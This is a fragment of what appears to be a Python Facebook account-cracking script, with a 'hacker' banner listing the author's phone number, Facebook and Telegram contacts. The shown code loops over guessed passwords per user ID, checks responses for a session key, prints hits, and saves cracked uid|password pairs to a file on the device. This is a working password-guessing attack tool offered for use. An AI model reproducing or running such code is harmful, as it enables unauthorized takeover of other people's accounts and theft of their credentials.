...
`------'`------'`------'`------'`------'
                              ...
                              \033[1;97F Jamilhacher
\033[1;97m--------------------------------------------------
\033[1;91m Author     : jamil king Hacker 
\033[1;91m WhatsApp   : 0093708509223      
\033[1;91m facebook   : https://www.facebook.com/profile.php?id=100078856130872
\033[1;91m Telegram   : Jamilhacking
\033[1;91m Status     : FREE
 \033[1;97F JamilVisal :Jamil
            :Jamilvisalhacker
\033[1;97m--------------------------------------------------
'''
loop = 0
	...
	try:
		...
		for pas in mking_pass:
			...
			if 'session_key' in po:
				...
				print('\r\r\033[1;32m [Jamil-OK] '+str(uid)+' | '+pas+'\033[1;97m')
				...
				print('\r\r\x1b[1;33m [JamilCP] '+str(uid)+' | '+pas+'\033[1;97m')
				open('/sdcard/Jamil-CP.txt','a').write(str(uid)+'|'+pas+'\n')
				cps.append(str(uid))
				break
			else:continue
		loop+=1
